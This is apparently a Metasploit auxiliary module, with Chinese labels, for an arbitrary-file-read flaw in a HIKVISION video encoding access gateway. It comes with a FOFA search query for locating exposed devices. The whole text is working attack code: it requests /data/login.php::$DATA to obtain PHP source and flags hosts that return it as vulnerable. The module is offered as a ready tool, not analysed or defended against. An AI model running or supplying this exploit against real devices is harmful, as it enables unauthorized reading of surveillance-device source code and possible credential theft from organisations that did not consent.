#fofa: title="视频编码设备接入网关"

require 'msf/core'
require 'net/http'

class MetasploitModule < Msf::Auxiliary
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'HIKVISION 视频编码设备接入网关 $DATA 任意文件读取',
                      'Description'    => 'HIKVISION 视频编码设备接入网关存在配置错误特性,特殊后缀请求php文件可读取源码.',
                      'Author'         => 'se2o',
                      'License'        => MSF_LICENSE,
                      'References'     =>
                        [
                          [ 'TY', '2023-09062' ]
                        ],
                      'DisclosureDate' => '2023-08-14'
          ))

  end

  def check
    ip = datastore['RHOSTS']
    port = datastore['RPORT']

    url = "http://#{ip}:#{port}/data/login.php::$DATA"
    uri = URI(url)

    response = send_request_cgi({
                                  'uri'     => uri.path,
                                  'method'  => 'GET'
                                })

    if response && response.code == 200 && response.body.include?('<?php')
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run
    ip = datastore['RHOSTS']
    port = datastore['RPORT']

    url = "http://#{ip}:#{port}/data/login.php::$DATA"
    uri = URI(url)

    response = send_request_cgi({
                                  'uri'     => uri.path,
                                  'method'  => 'GET'
                                })

    print_good("Data collection checkpoint start")

    if response && response.code == 200 && response.body.include?('<?php')
      print_good("此资产存在任意文件读取漏洞")
      print_good("URI:#{uri}")
    else
      print_error("此资产不存在任意文件读取漏洞")
    end

    print_good("Data collection checkpoint end")

  end
end
